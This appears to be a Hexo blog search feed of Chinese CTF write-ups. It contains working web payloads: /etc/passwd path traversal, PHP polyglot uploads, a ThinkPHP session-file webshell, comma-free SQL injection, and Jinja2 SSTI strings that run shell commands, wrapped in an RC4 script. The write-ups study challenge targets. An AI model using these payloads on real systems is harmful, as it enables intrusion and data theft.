<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>picoCTF2023</title>
      <link href="/2023/03/23/picoCTF2023/"/>
      <url>/2023/03/23/picoCTF2023/</url>
      
        <content type="html"><![CDATA[<p>提权</p><p>ssh给的账号密码，就是登上去的账号密码（废话，就是sudo 时候填的密码。。）</p><p>先passwd改个密码，方便输入</p><p>找不到flag，在&#x2F;etc&#x2F;hosts里面看到了个challenge，联想到了&#x2F;下面有个challenge，进去里面把那个metadata.json给cat了就看到了。。</p><p><a href="https://cloud.tencent.com/developer/article/1942516">Linux 提权总结 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://www.freebuf.com/articles/system/261271.html">Linux通过第三方应用提权实战总结 - FreeBuf网络安全行业门户</a></p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p><a href="https://cloud.tencent.com/developer/article/1544037">https://cloud.tencent.com/developer/article/1544037</a></p><p>bash</p><p>网站学习：</p><p><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic">https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic</a></p><p><a href="https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29">https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29</a></p><p>题目以往：</p><p><a href="https://xp0int-team.feishu.cn/docx/AwbudgiT7o2e1cx6kZicaP7In3d">https://xp0int-team.feishu.cn/docx/AwbudgiT7o2e1cx6kZicaP7In3d</a></p><p>xsctf,hgame2</p><p>java</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF 2023</title>
      <link href="/2023/03/01/VNCTF-2023/"/>
      <url>/2023/03/01/VNCTF-2023/</url>
      
        <content type="html"><![CDATA[<p>就写了象棋王子，其他rust和go，没学过没写。</p><p>留着以后再来康康</p><p><a href="https://www.cnblogs.com/nLesxw/p/VNCTF2023.html">https://www.cnblogs.com/nLesxw/p/VNCTF2023.html</a></p><p><a href="https://blog.csdn.net/akxnxbshai/article/details/129113110">https://blog.csdn.net/akxnxbshai/article/details/129113110</a></p><p><a href="https://blog.csdn.net/qq_54704239/article/details/129100897">https://blog.csdn.net/qq_54704239/article/details/129100897</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hscctf 2023</title>
      <link href="/2023/02/26/hscctf-2023/"/>
      <url>/2023/02/26/hscctf-2023/</url>
      
        <content type="html"><![CDATA[<h3 id="题目地址："><a href="#题目地址：" class="headerlink" title="题目地址："></a>题目地址：</h3><p><a href="https://race.hscsec.cn/challenges">https://race.hscsec.cn/challenges</a></p><p>这个网址里面还有其他靶场，有机会可以看看。</p><h3 id="EASYPHY"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h3><p>文件上传题</p><p>mime检测，得图片前缀绕过</p><p>首个页面有文件包含功能。</p><p>&#x2F;?acti0n&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p><p>?acti0n&#x3D;upload&#x2F;4869953b4070fbd1d6823d6ee6561985&#x2F;wen.png</p><p>存在文件包含。这里可以将png解析为PHP执行，所以可以<code>GIF89a&lt;?php show_source(&quot;flag.php&quot;); ?&gt;</code>,不是很懂（坑），不过做的时候发现可以<code>GIF89a&lt;?php phpinfo(); ?&gt;</code>，这里也是一个启发吧，发现disable_function也过滤了很多。</p><p>另外一种是phar，读取源码可以发现有file_exist()，删除的时候会触发到。</p><p>这题学到主要是网页的各个页面都是有用的，一开始做题时候漏掉了首页。发现不了文件包含。读取源码base64被ban了，可以大小写绕过（baSe64）,或者rot13</p><p>str_rot13(x)，使用一次函数加密，两次返回原值。</p><p>伪协议绕过：<a href="https://blog.csdn.net/gental_z/article/details/122303393">(124条消息) PHP Filter伪协议Trick总结_swtre33的博客-CSDN博客</a></p><p>然后就是直接show_source(‘flag.php’)。而不用写马那些操作（那些也被ban了很多）</p><p>文件上传大概目的就上传文件，还有解析文件。</p><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;GET /view?filename=app.py&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewFile</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;cgroup&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;self&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;文件存在&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;</span></span><br><span class="line"><span class="string">            &#123;&#125;</span></span><br><span class="line"><span class="string">            &lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;文件不存在&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;</span></span><br><span class="line"><span class="string">        文件不存在</span></span><br><span class="line"><span class="string">        &lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道学到了，文件读取+debug大概就是要算Pin（因为算Pin要读取很多值才能算）,算pin脚本网上很多了。</p><p><a href="https://blog.csdn.net/qq_35782055/article/details/129126825">https://blog.csdn.net/qq_35782055/article/details/129126825</a></p><p>这道题做的时候也大概猜要这样了，不过嫌麻烦没去写（摸鱼）</p><h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>找不到后台地址，留个眼（坑）。佬们说弱密码登录后台（题目有字典，会被限制，用随机xff头），然后搜存在的cms。</p><p><a href="http://max666.fun/416.html">http://max666.fun/416.html</a></p><p><a href="https://www.cnblogs.com/vconlln/p/17116081.html">https://www.cnblogs.com/vconlln/p/17116081.html</a></p><p><a href="https://www.cnblogs.com/V3g3t4ble/p/17114004.html#ezsyflask">https://www.cnblogs.com/V3g3t4ble/p/17114004.html#ezsyflask</a></p><p><a href="https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/index.html">https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/index.html</a></p><p><a href="http://blog.shenghuo2.top/hscsec-ctf-2023-wp/#misc">http://blog.shenghuo2.top/hscsec-ctf-2023-wp/#misc</a></p><h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>这次都是图片，做题仔细看，放大看。百度识图，谷歌识图，地图，</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这次就做了ezssti还有几道社工和一道misc,没怎么打，不过也确实实力不够，再加油。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GYCTF2020]EasyThinking</title>
      <link href="/2023/02/25/GYCTF2020-EasyThinking/"/>
      <url>/2023/02/25/GYCTF2020-EasyThinking/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开直接一句话 <code>Vulnerability Search</code>,再查看查看，注册登录一下，漏洞点应该是在搜索了。发现会显示用户名，还有历史搜索记录。根据题目名字，应该是thinkPHP漏洞，随便在url输入不存在的地址。报错<code>[ThinkPHP](http://www.thinkphp.cn)         V6.0.0         </code></p><p>且会有路径<code>控制器不存在:app\home\controller\Sadasf</code></p><p>网上搜索一下漏洞。发现大致有两个，一个是反序列化，一个是任意文件写入漏洞。试着搜一下，发现在这题不能硬套，而且还没有利用到搜索这个功能点。这种题应该基本会有源码泄露，方便审计。试一试，<a href="http://www.zip可以下载到源码./">www.zip可以下载到源码。</a></p><h3 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h3><p>根据报错路径，查看一下文件，一般这些框架都是看controller有什么，在member.php里面看到了网页提供的功能函数（搜索，首页，登录等）</p><p>（坑）（在网上找不到分析得很彻底的文章，打算等以后学thinkPHP再来。可以试一下本地复现网上的漏洞）</p><blockquote><p>session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）<br>然后再search搜索的内容会直接保存在&#x2F;runtime&#x2F;session&#x2F;目录下，getshell</p></blockquote><p>解题流程：</p><p>注册账号，登录时候改抓包改PHPsessid为32位（包含.php)的如：1234567891234567891234567890.php ,</p><p>而搜索框post的值写入到session文件中，文件名规则是sess_PHPsessid,存放在&#x2F;runtime&#x2F;session&#x2F;下。注册后搜索<code>&lt;?php phpinfo(); ?&gt;</code>，且PHPsessid还是要改成1234567891234567891234567890.php</p><p>然后再访问&#x2F;runtime&#x2F;session&#x2F;sess_1234567891234567891234567890.php</p><p>查disable_functions，直接写马，然后用蚁剑插件了。选择那个PHP7——back，同之前的rce me一样，可以看我之前的博客。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.likecs.com/show-921922.html#sc=6238">https://www.likecs.com/show-921922.html#sc=6238</a></p><p><a href="https://www.cnblogs.com/yesec/p/12571861.html">https://www.cnblogs.com/yesec/p/12571861.html</a></p><p><a href="https://blog.csdn.net/weixin_45646006/article/details/120657905">https://blog.csdn.net/weixin_45646006/article/details/120657905</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018]Unfinish</title>
      <link href="/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/"/>
      <url>/2023/02/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/</url>
      
        <content type="html"><![CDATA[<p>二次注入</p><p>有Login.php，猜测register.php，注册后登录，是鬼刀的壁纸，还有左边可以看见用户名。没什么注入点感觉。猜测注册还有登录的地方可以注入，然后登录成功后又将用户名从数据库中拿出来，可能会有二次注入。且注入点应该在用户名。</p><p>重新注册。邮箱密码正常，用户名输入一些奇怪的字符，发现注册成功会跳转，不成功则还是在原来的PHP页面，有些字符是黑名单里面的，返回nonnnnooo!!</p><p>fuzz information过滤了，</p><p>发现邮箱密码重复，则会登录之前的用户，即不会覆盖掉。</p><p>用网上的脚本，还有自己的脚本，发现跑着跑着会有字符没法显示，导致出错。</p><p>（坑）</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1’ and ‘0测试</p><p>+号 ‘0’+’hex(‘flagsa’)’-&gt;得到hex值</p><p>有的16进制后有字母，进行+，字母会被弄没，导致结果不准。可以两次hex</p><p>‘0’+hex(hex(‘flag’))+’0’,但是会变成科学计数法</p><p>ASCII</p><p>‘0’+ascii(substr(database(),1,1))+’0’</p><p>但是题目过滤了逗号，那就用from…for…</p><p>‘0’+ascii(substr(database() from 1 for 1))+’0’</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mayi077.gitee.io/2020/08/18/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/">https://mayi077.gitee.io/2020/08/18/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/</a></p><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107900247">https://blog.csdn.net/hxhxhxhxx/article/details/107900247</a></p><p><a href="https://blog.csdn.net/qq_42702981/article/details/120285326">https://blog.csdn.net/qq_42702981/article/details/120285326</a></p><p><a href="https://blog.csdn.net/qq_61778128/article/details/127255343">https://blog.csdn.net/qq_61778128/article/details/127255343</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 华东南赛区]Double Secret</title>
      <link href="/2023/02/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
      <url>/2023/02/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开，给了一句Welcome To Find Secret，常规搜索一下信息，没找到。</p><p>由题目和给的话猜测?secret,随便传一个，没反应。</p><p>结果是&#x2F;secret  长知识了。 又有一句话Tell me your secret.I will encrypt it so others can’t see   题目说double secret 那么就应该是?secret了，发现会根据传递的来回显，再传一些奇奇怪怪的试一试，会发现报错。是Python的flask，debug模式。看报错的具体内容。</p><p><img src="D:\My_Software\A_software\github_hexo\blog\themes\butterfly\source\img\博客图片\image-20230220234643424.png" alt="image-20230220234643424"></p><p>发现有用了rc4解密，那我们传进去的应该是得rc4加密后的内容。这里用了render_template_string函数，可以判断有ssti漏洞</p><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>在 密码学 中， RC4 （来自<strong>Rivest Cipher 4</strong>的缩写）是一种 流加密 算法， 密钥 长度可变。 它加解密使用相同的密钥，因此也属于 对称加密算法 。</p><h4 id="网上脚本"><a href="#网上脚本" class="headerlink" title="网上脚本"></a>网上脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__.eval(\&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()\&quot;)&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload可以换成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/flag.txt&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/RABCDXB/article/details/122816156">https://blog.csdn.net/RABCDXB/article/details/122816156</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105661450">https://blog.csdn.net/mochu7777777/article/details/105661450</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> flask </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NPUCTF2020]ezinclude</title>
      <link href="/2023/02/14/NPUCTF2020-ezinclude/"/>
      <url>/2023/02/14/NPUCTF2020-ezinclude/</url>
      
        <content type="html"><![CDATA[<p>做题：</p><p>打开直接提示用户名密码错误，看源代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">抓包发现有cookie是Hash=fa25e54758d5d5c1927781a6ede89f8a</span><br><span class="line">放包看响应有Set-Cookie: Hash=576322dd496b99d07b5b0f7fa7934a25;</span><br><span class="line">尝试传几个不同的name，发现hash随之改变</span><br><span class="line">猜测hash值就是md5后的结果</span><br><span class="line">传?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25</span><br><span class="line">发现</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;flflflflag.php&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">直接访问会跳转到404，则还是抓包</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">           <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;404.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">include($_GET[&quot;file&quot;])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>文件包含，那么可以试试读取源码:（也可以试读取其他文件，但是试了找不到flag）</p><p>flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flflflflag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@<span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@<span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;Hash&quot;</span>,<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>),<span class="title function_ invoke__">time</span>()+<span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret</span>=<span class="string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看不出什么端倪，那就应该还有其他文件，扫一下，发现有个老六dir.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dir.php可以打印&#x2F;tmp下的内容，所以想方法将文件搞到tmp下</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="法一利用PHP7版本漏洞-segment-fault特性"><a href="#法一利用PHP7版本漏洞-segment-fault特性" class="headerlink" title="法一利用PHP7版本漏洞 segment fault特性"></a>法一利用PHP7版本漏洞 segment fault特性</h4><p>原理参考：</p><p><a href="https://blog.csdn.net/weixin_45646006/article/details/120817553">https://blog.csdn.net/weixin_45646006/article/details/120817553</a></p><p>大概就是php:&#x2F;&#x2F;filter&#x2F;的过滤器strip_tags,存在漏洞可以让PHP执行时候出现segment fault，则此时上传文件会保存在缓存目录下，不会被垃圾回收机制清除。</p><p>默认是&#x2F;tmp目录下。只需要php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;xxx文件，同时再上传一个文件上去，就可以触发利用。</p><h5 id="过程与脚本"><a href="#过程与脚本" 